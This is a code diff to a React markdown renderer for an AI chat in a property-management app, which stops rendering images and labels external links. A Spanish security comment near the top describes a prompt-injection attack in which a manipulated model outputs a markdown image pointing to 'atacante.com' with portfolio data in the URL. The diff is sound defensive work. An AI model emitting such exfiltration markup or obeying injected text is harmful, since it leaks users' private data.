@@ -1,15 +1,142 @@
 'use client';
 
+import { Children, isValidElement, useRef, type ReactNode } from 'react';
+import { ArrowSquareOut } from '@phosphor-icons/react';
 import ReactMarkdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import type { Components } from 'react-markdown';
 import { cn } from '@/lib/utils';
+import { rehypeRevelar } from '@/lib/chat/rehype-revelar';
+import { prefiereMenosMovimiento } from '@/lib/chat/revelado';
+import { intencionDelEnlace } from '@/lib/chat/acciones-del-hilo';
+import { useBetaChatOpcional } from '@/lib/context/BetaChatContext';
+import { useI18n } from '@/lib/i18n';
 
 interface MarkdownRendererProps {
   content: string;
   className?: string;
   /** When true, appends a blinking cursor after the content */
   isStreaming?: boolean;
+}
+
+/**
+ * ── Por qué no se pintan imágenes y los enlaces dicen adónde van ──────────
+ * (auditoría de seguridad 23-09). Lo que pinta este componente lo escribe un
+ * modelo, y un modelo se puede manipular con texto que él mismo lee (una nota
+ * de un inquilino, el nombre de un inmueble importado, un correo). La jugada
+ * clásica es que responda `![](https://atacante.com/x?d=<datos del snapshot>)`:
+ * el navegador pide esa imagen SOLO, sin clic, y los datos de la cartera salen
+ * en la URL. Por eso:
+ *   - una imagen NO se carga nunca: se muestra como texto con su destino;
+ *   - un enlace a otro sitio muestra su dominio al lado, para que un «Ver
+ *     estado de cuenta» que en realidad va a otro lado se vea antes del clic.
+ * Es la segunda puerta: el micro ya quita las imágenes de la respuesta
+ * (`nico8/sec-ia`) y la CSP (`img-src`) cierra los orígenes.
+ */
+
+/**
+ * El dominio (y el comienzo de la ruta) de un enlace que sale de Leasefy, o
+ * `null` si es interno (`/panel/...`, `#ancla`) o no se puede leer.
+ */
+export function destinoExterno(href: string | undefined | null): string | null {
+  if (!href) return null;
+  const crudo = href.trim();
+  if (crudo.startsWith('/') && !crudo.startsWith('//')) return null;
+  if (crudo.startsWith('#')) return null;
+  // Se resuelve contra nuestro origen: así `//otro.sitio/x` (sin esquema)
+  // también cuenta como externo, y lo relativo queda en casa.
+  const base =
+    typeof window !== 'undefined' && window.location?.origin && window.location.origin !== 'null'
+      ? window.location.origin
+      : 'https://leasefy.invalid';
+  let url: URL;
+  try {
+    url = new URL(crudo, base);
+  } catch {
+    return null;
+  }
+  if (url.protocol === 'mailto:' || url.protocol === 'tel:') return url.href.slice(url.protocol.length);
+  if (url.origin === new URL(base).origin) return null;
+  const ruta = url.pathname === '/' ? '' : url.pathname;
+  const corta = ruta.length > 30 ? `${ruta.slice(0, 30)}…` : ruta;
+  return `${url.hostname}${corta}`;
+}
+
+/** El texto plano de lo que va dentro de un enlace (para mandarlo como mensaje). */
+export function textoDe(nodo: ReactNode): string {
+  let salida = '';
+  Children.forEach(nodo, (hijo) => {
+    if (typeof hijo === 'string' || typeof hijo === 'number') salida += String(hijo);
+    else if (isValidElement<{ children?: ReactNode }>(hijo)) salida += textoDe(hijo.props.children);
+  });
+  return salida;
+}
+
+/**
+ * Un enlace de la respuesta, SIN sacar de la conversación (Nico, 23-09:
+ * «debe todo funcionar dentro del chat»).
+ *
+ *   · Interno (`/panel/…`): antes abría la pantalla en otra pestaña. Ahora es
+ *     un MENSAJE DE LA PERSONA con el texto del enlace; si la ruta nombra una
+ *     entidad (un contrato, un propietario…), lleva la intención de ver su
+ *     ficha y el micro la trae al hilo. Sin chat alrededor, es texto.
+ *   · Externo (otro dominio, http/https): se abre en otra pestaña CON AVISO —
+ *     el dominio al lado y un ícono que lo dice— para que un «Ver estado de
+ *     cuenta» que va a otro sitio se vea antes del clic.
+ *   · Correo y teléfono: texto, una sola vez. GFM convierte
+ *     «mateo@ejemplo.com» en un enlace y el dominio se pintaba al lado:
+ *     «mateo@ejemplo.com (mateo@ejemplo.com)» (captura de Nico, 23-09).
+ *   · Cualquier otro esquema: texto. Nada que el modelo escriba se ejecuta.
+ */
+function EnlaceDelChat({ href, children }: { href?: string; children?: ReactNode }) {
+  const chat = useBetaChatOpcional();
+  const { t } = useI18n();
+  const crudo = (href ?? '').trim();
+  const visible = textoDe(children).trim();
+
+  if (/^(mailto|tel):/i.test(crudo)) {
+    const direccion = decodeURIComponent(crudo.replace(/^(mailto|tel):/i, ''));
+    return (
+      <span>
+        {children}
+        {visible && visible !== direccion && <span className="ml-1 font-mono text-[14px] text-muted-foreground">({direccion})</span>}
+      </span>
+    );
+  }
+
+  const destino = destinoExterno(crudo);
+  if (destino) {
+    if (!/^(https?:)?\/\//i.test(crudo)) return <span>{children}</span>;
+    return (
+      <a
+        href={crudo}
+        className="text-primary hover:underline"
+        target="_blank"
+        rel="noopener noreferrer"
+        title={crudo}
+        aria-label={`${visible} — ${t('beta.enElChat.enlaceExterno', { destino })}`}
+      >
+        {children}
+        <span className="ml-1 inline-flex items-center gap-0.5 font-mono text-[14px] text-muted-foreground">
+          <ArrowSquareOut className="size-3.5" aria-hidden />({destino})
+        </span>
+      </a>
+    );
+  }
+
+  // Interno: un mensaje de la persona, no una pantalla.
+  if (!chat || !crudo || crudo.startsWith('#') || !visible) return <span>{children}</span>;
+  const ocupado = chat.isThinking || chat.isStreaming || chat.isAgentsRunning;
+  return (
+    <button
+      type="button"
+      disabled={ocupado}
+      className="text-primary hover:underline disabled:cursor-not-allowed disabled:opacity-60"
+      onClick={() => chat.sendMessage(visible, { intencion: intencionDelEnlace(crudo) })}
+    >
+      {children}
+    </button>
+  );
 }
 
 /**
@@ -35,16 +162,19 @@ const markdownComponents: Components = {
   em: ({ children }) => (
     <em className="italic">{children}</em>
   ),
-  a: ({ href, children }) => (
-    <a
-      href={href}
-      className="text-primary hover:underline"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      {children}
-    </a>
-  ),
+  a: ({ href, children }) => <EnlaceDelChat href={href}>{children}</EnlaceDelChat>,
+  // Ninguna imagen se carga: se dice que había una y adónde apuntaba. Ver
+  // «Por qué no se pintan imágenes» abajo.
+  img: ({ src, alt }) => {
+    const url = typeof src === 'string' ? src : undefined;
+    const destino = destinoExterno(url) ?? url;
+    return (
+      <span className="text-muted-foreground">
+        [Imagen{alt ? `: ${alt}` : ''}
+        {destino && <span className="ml-1 font-mono text-[14px]">({destino})</span>}]
+      </span>
+    );
+  },
   code: ({ className, children, ...props }) => {
     // Detect code blocks (have a language className from react-markdown)
     const isBlock = className?.startsWith('language-');
@@ -110,6 +240,44 @@ const markdownComponents: Components = {
   ),
 };
 
+/*
+ * El fundido del texto recién revelado. Dos componentes DISTINTOS a propósito:
+ * `rehypeRevelar` alterna la etiqueta en cada bloque para que React monte un
+ * elemento nuevo y la animación vuelva a correr (ver el plugin).
+ */
+const CLASE_REVELADO = 'animate-in fade-in duration-300 ease-out motion-reduce:animate-none';
+function RevelarA({ children }: { children?: ReactNode }) {
+  return <span className={CLASE_REVELADO}>{children}</span>;
+}
+function RevelarB({ children }: { children?: ReactNode }) {
+  return <span className={CLASE_REVELADO}>{children}</span>;
+}
+const componentesConRevelado = {
+  ...markdownComponents,
+  'revelar-a': RevelarA,
+  'revelar-b': RevelarB,
+} as Components;
+
+/**
+ * Desde dónde fundir: si el texto creció en más de un carácter desde el cuadro
+ * anterior, lo nuevo es un BLOQUE (fase acelerada del revelado) y se funde. Una
+ * sola letra más es el tecleo de siempre: no necesita fundido.
+ */
+function useRevelado(content: string, isStreaming: boolean) {
+  const previo = useRef({ largo: 0, desde: null as number | null, bloques: 0 });
+  const r = previo.current;
+  if (!isStreaming) {
+    r.largo = content.length;
+    r.desde = null;
+  } else if (content.length !== r.largo) {
+    const crecio = content.length - r.largo;
+    r.desde = crecio > 1 && r.largo > 0 && !prefiereMenosMovimiento() ? r.largo : null;
+    if (r.desde !== null) r.bloques += 1;
+    r.largo = content.length;
+  }
+  return { desde: r.desde, etiqueta: r.bloques % 2 === 0 ? 'revelar-a' : 'revelar-b' };
+}
+
 /**
  * MarkdownRenderer - Renders markdown content in chat bubbles.
  *
@@ -123,6 +291,7 @@ export function MarkdownRenderer({
   className,
   isStreaming = false,
 }: MarkdownRendererProps) {
+  const revelado = useRevelado(content, isStreaming);
   return (
     <div
       className={cn(
@@ -142,7 +311,11 @@ export function MarkdownRenderer({
         className
       )}
     >
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={markdownComponents}>
+      <ReactMarkdown
+        remarkPlugins={[remarkGfm]}
+        rehypePlugins={revelado.desde !== null ? [[rehypeRevelar, revelado]] : []}
+        components={revelado.desde !== null ? componentesConRevelado : markdownComponents}
+      >
         {content}
       </ReactMarkdown>
       {/* Sin cursor de streaming (Nico, 2026-08-27: «esa barra azul que da como
